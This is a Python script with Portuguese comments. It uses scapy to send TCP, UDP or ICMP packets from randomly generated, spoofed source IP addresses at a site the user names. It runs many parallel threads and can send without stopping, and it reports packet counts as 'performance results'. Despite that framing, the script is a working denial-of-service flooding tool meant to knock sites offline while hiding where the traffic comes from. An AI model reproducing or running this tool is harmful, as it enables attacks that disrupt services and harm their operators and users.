import random
import threading
import socket
import time
import concurrent.futures
from scapy.all import *

# Variáveis para medição de desempenho
packets_sent = 0
packets_lost = 0
start_time = 0
response_time = 0

# Função para gerar uma lista de endereços IP aleatórios (para melhor desempenho)
def generate_random_ips(count):
    return [".".join(str(random.randint(1, 254)) for _ in range(4)) for _ in range(count)]

# Função para resolver o endereço IP associado ao site
def resolve_target_IP(target_site):
    try:
        target_IP = socket.gethostbyname(target_site)
        return target_IP
    except socket.gaierror:
        print("Não foi possível resolver o endereço IP do site.")
        return None

# Função para enviar pacotes a partir de endereços IP e portas aleatórias
def send_packet(source_ip, target_IP, source_port, packet_type, timeout):
    global packets_sent, packets_lost, response_time

    packet = IP(src=source_ip, dst=target_IP) / packet_type(sport=source_port)
    response = sr1(packet, timeout=timeout, verbose=0)

    if not response:
        packets_lost += 1

    packets_sent += 1

# Função para enviar pacotes em paralelo
def send_packets(target_site, num_threads, interval, specific_ports, packet_type, total_packets, timeout):
    global packets_sent, packets_lost, start_time, response_time

    target_IP = resolve_target_IP(target_site)
    if not target_IP:
        return

    source_ips = generate_random_ips(num_threads)
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        while packets_sent < total_packets or total_packets == -1:
            futures = []
            for source_ip in source_ips:
                for source_port in specific_ports:
                    future = executor.submit(send_packet, source_ip, target_IP, source_port, packet_type, timeout)
                    futures.append(future)

            time.sleep(interval)

            for future in futures:
                future.result()

    end_time = time.time()
    elapsed_time = end_time - start_time

    # Resultados de desempenho
    packets_per_second = packets_sent / elapsed_time
    packets_lost_percentage = (packets_lost / packets_sent) * 100

    print("\n===== Resultados de Desempenho =====")
    print(f"Pacotes enviados: {packets_sent}")
    print(f"Pacotes perdidos: {packets_lost} ({packets_lost_percentage:.2f}% do total)")
    print(f"Tempo total de envio: {elapsed_time:.2f} segundos")
    print(f"Taxa de envio média: {packets_per_second:.2f} pacotes por segundo")
    print(f"Tempo de resposta do site: {response_time:.2f} segundos")

# Função que imprime o menu principal e retorna a escolha do usuário
def menu():
    print("===== Menu =====")
    print("1. Enviar pacotes")
    print("2. Sair")

    choice = input("Escolha uma opção: ")
    return choice

# Função principal do programa
def main():
    target_site = input("Digite o nome do site de destino: ")
    num_threads = int(input("Digite a quantidade de threads (recomendado até 500): "))
    interval = float(input("Digite o intervalo de envio de pacotes (em segundos): "))
    specific_ports = list(map(int, input("Digite as portas específicas separadas por espaços (exemplo: 80 443): ").split()))
    packet_type = input("Digite o tipo de pacote (TCP, UDP, ICMP): ").upper()
    total_packets = int(input("Digite o número total de pacotes a serem enviados (-1 para enviar continuamente): "))
    timeout = int(input("Digite o tempo limite em segundos (0 para nenhum): "))

    if packet_type == "TCP":
        packet_type = TCP
    elif packet_type == "UDP":
        packet_type = UDP
    elif packet_type == "ICMP":
        packet_type = ICMP
    else:
        print("Tipo de pacote inválido. Saindo do programa.")
        return

    while True:
        choice = menu()

        if choice == '1':
            send_packets(target_site, num_threads, interval, specific_ports, packet_type, total_packets, timeout)
        elif choice == '2':
            print("Saindo do programa.")
            break
        else:
            print("Opção inválida. Digite novamente.")

if __name__ == "__main__":
    main()
